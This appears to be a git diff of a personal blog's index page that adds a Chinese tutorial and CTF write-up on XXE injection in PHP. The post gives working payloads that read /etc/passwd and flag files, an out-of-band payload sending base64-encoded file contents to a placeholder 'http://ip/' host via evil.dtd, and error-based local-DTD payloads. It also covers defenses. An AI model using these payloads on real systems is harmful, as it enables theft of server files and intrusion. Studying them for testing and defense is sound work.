@@ -28,7 +28,7 @@
   
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1568121643271">
+  <link rel="stylesheet" href="/css/style.css?v=1571970697866">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -52,7 +52,7 @@
         </a>
     </div>
     <div class="nexmoe-count">
-        <div><span>Articles</span>3</div>
+        <div><span>Articles</span>4</div>
         <div><span>Tags</span>0</div>
         <div><span>Categories</span>0</div>
     </div>
@@ -102,7 +102,7 @@
   <div class="nexmoe-widget-wrap">
     <h3 class="nexmoe-widget-title">Archive</h3>
     <div class="nexmoe-widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
     </div>
   </div>
 
@@ -119,6 +119,95 @@
   <div id="nexmoe-content">
     <div class="nexmoe-primary">
         <section class="nexmoe-posts" id="brand-waterfall">
+    
+    <div class="nexmoe-post">
+        <a href="/2019/10/25/xxe/">
+            <div class="nexmoe-post-cover mdui-ripple"> 
+                
+                <img src="http://imgsrc.baidu.com/forum/pic/item/268709087bf40ad1beb3fbb65e2c11dfa8ecce08.jpg" alt="php_xxe复现[php中的xml外部实体注入]">
+                
+                <h1>php_xxe复现[php中的xml外部实体注入]</h1>
+            </div>
+        </a>
+        <div class="nexmoe-post-meta">
+            <a><i class="nexmoefont icon-calendar-fill"></i>2019年10月25日</a>
+            <a><i class="nexmoefont icon-areachart"></i>1.1k 字</a>
+            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 5 分钟</a>
+            
+            
+        </div>
+        <article>
+            
+            <p>#XXE概念#</p>
+<hr>
+<p>###XXE(XML External Entity Injection) 全称为 XML 外部实体注入</p>
+<p>   xml:即可扩展标记语言，xml是互联网数据传输的重要工具，它可以跨越互联网任何的平台，不受编程语言和操作系统的限制，可以说它是一个拥有互联网最高级别通行证的数据携带者。xml是当前处理结构化文档信息中相当给力的技术，xml有助于在服务器之间穿梭结构化数据，这使得开发人员更加得心应手的控制数据的存储和传输。</p>
+<p>XML详细语法：<a href="https://blog.csdn.net/com_ma/article/details/73277535" target="_blank" rel="noopener">https://blog.csdn.net/com_ma/article/details/73277535</a></p>
+<p>XXE漏洞引用的外部实体并且未对外部实体进行敏感字符的过滤，从而可以造成命令执行，目录遍历等</p>
+<p>XML的格式规范有 DTD（document type definition）来控制</p>
+<p>###0X内部实体声明</p>
+<p><img src="E:/youdaoyun/fff1173056230@163.com/1959bf6d1785469eb54bcdcb9767cccf/clipboard.png" alt="img"></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;      &lt;!-- XML声明 --&gt; &lt;!DOCTYPE test [                            &lt;!-- 文档类型定义 --&gt; &lt;!ELEMENT name ANY &gt;                        &lt;!-- []内的即为定义内容 --&gt; &lt;!ENTITY tea &quot;this_is_a_test&quot; &gt;]&gt; &lt;root&gt; &lt;name&gt;&amp;tea;&lt;/name&gt; &lt;/root&gt; </code></pre><p>###0X外部实体声明[XML外部实体注入利用点]</p>
+<p>区别在于</p>
+<!ENTITY 实体名称 SYSTEM "URI"><p> </p>
+<p>外部实体引用支持通过协议</p>
+<p>eg:  file://</p>
+<p><img src="E:/youdaoyun/fff1173056230@163.com/54ee3ae6c49a496c8800c1983c9d8746/clipboard.png" alt="img"></p>
+<p>这即为XXE攻击</p>
+<p>支持的协议</p>
+<p><img src="E:/youdaoyun/fff1173056230@163.com/28d3a99c3bbb4079bd19dd6223d3e3f0/clipboard.png" alt="img"></p>
+<p>XXE攻击：</p>
+<p>###0X有回显读本地敏感文件</p>
+<p>如上</p>
+<p><img src="E:/youdaoyun/fff1173056230@163.com/ff19de43dd474533aecde09b244cbf6d/clipboard.png" alt="img"></p>
+<p>读取了 /etc/passwd/</p>
+<p>###0X无回显读取本地敏感文件(Blind OOB XXE)</p>
+<p><img src="E:/youdaoyun/fff1173056230@163.com/b3d6a042c5b54f5999795e3e883bd7ab/clipboard.png" alt="img"></p>
+<p>这时可以借助http协议，将获取到文件内容发送到远程服务器上</p>
+<p>从而获取文件内容</p>
+<p>事先在远程服务上写入 evil.dtd </p>
+<pre><code>&lt;!ENTITY % send SYSTEM &#39;http://ip/?%file;&#39;&gt; </code></pre><p>payload:</p>
+<pre><code>&lt;!DOCTYPE foo [     &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./dom.php&quot;&gt;     &lt;!ENTITY  % xxe SYSTEM &quot;http://ip/evil.dtd&quot; &gt;     %xxe;     %send; ]&gt; </code></pre><p><img src="E:/youdaoyun/fff1173056230@163.com/f0b3ae0742534c84856df87369a268bf/clipboard.png" alt="img"></p>
+<p>先利用php为协议将文件用base64读取出来，然后以参数的形式发送到远程服务器局限性是，有漏洞的服务器和你的接收的服务器之前与防火墙，可能就无法传输。</p>
+<p>ps:也可通过报错读取文件内容</p>
+<p>###0X内网探测</p>
+<p>关键点：利用file协议读取我们作为支点服务器的网络配置文件</p>
+<p>可以进行主机探测，端口扫描，ssrf，注入</p>
+<p>例题：</p>
+<p>api调用</p>
+<p><a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a></p>
+<p>payload:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE abcd[ &lt;!ENTITY any SYSTEM &quot;file:///home/ctf/flag.txt&quot;&gt;]&gt;  &lt;something&gt;&amp;any;&lt;/something&gt; </code></pre><p><img src="E:/youdaoyun/fff1173056230@163.com/4fc7e7afb62844d1ba0c6399d8f8cbf3/clipboard.png" alt="img"></p>
+<p>Ogeek线上 0x LookAround</p>
+<p><img src="E:/youdaoyun/fff1173056230@163.com/e379d02af5f24986822790c1b6eaab73/clipboard.png" alt="img"></p>
+<p>常见exp  xml合法则无回显，异常回报500</p>
+<p>结合</p>
+<p>tip:tomcat:8-jre8 中的fonts.dtd可用</p>
+<p>参考：<a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" target="_blank" rel="noopener">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt; &lt;!DOCTYPE message [     &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;           &lt;!ENTITY % expr &#39;aaa)&gt;         &lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;         &lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:///abcxyz/%file;&#39;&gt;&quot;&gt;         %eval;         %error;         &lt;!ELEMENT aa (bb&#39;&gt;                          %local_dtd; ]&gt; &lt;message&gt;&lt;/message&gt;                         &lt;!-- --&gt; </code></pre><pre><code>&lt;!DOCTYPE message [     &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;    &lt;!-- 强制执行本地DTD--&gt;      &lt;!ENTITY % expr &#39;aaa)&gt;         &lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;         &lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:///abcxyz/%file;&#39;&gt;&quot;&gt;         %eval;                     &lt;!--重新定义参数实体引用--&gt;                 %error;            &lt;!ELEMENT aa (bb&#39;&gt;         &lt;!--将DTD里内容闭合来重新执行--&gt;      %local_dtd; ]&gt; &lt;message&gt;&lt;/message&gt; </code></pre><p>内部DTD中，是不可以一个实体里包含另一个实体的。</p>
+<p>选可以用的本地DTD文件，该DTD中定义了实体变量并且进行了引用。</p>
+<p>在内部DTD中使用外部DTD的内容，只需要在目标主机上强制执行本地DTD文件，并在其中重新定义参数实体引用</p>
+<p>防护：</p>
+<p>防御：<strong>PHP：</strong></p>
+<p>libxml_disable_entity_loader(true);</p>
+<p>禁用外部实体，配置XML parser只能使用静态dtd</p>
+<p>过滤及验证用户提交的xml数据</p>
+<p>不允许xml中含有任何自己声明的dtd</p>
+<p>复现部分：</p>
+<ul>
+<li>PHP 7.0.30</li>
+<li>libxml 2.8.0</li>
+</ul>
+<p>2.9之后默认不解析外部实体注入，</p>
+<p><img src="E:/youdaoyun/fff1173056230@163.com/69e3b691cba042b6b07512ee6974a4a3/clipboard.png" alt="img"></p>
+<p>参考：</p>
+<p><a href="https://mp.weixin.qq.com/s/1wjDP8SkT-7py96WSe-gxw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/1wjDP8SkT-7py96WSe-gxw</a> </p>
+<p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p>
+<p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" target="_blank" rel="noopener">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p>
+
+            
+        </article>
+    </div>
     
     <div class="nexmoe-post">
         <a href="/2019/09/10/test/">
@@ -353,7 +442,7 @@ print(r.text)</code></pre>
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1568121643278"></script>
+<script src="/js/app.js?v=1571970697872"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 
 
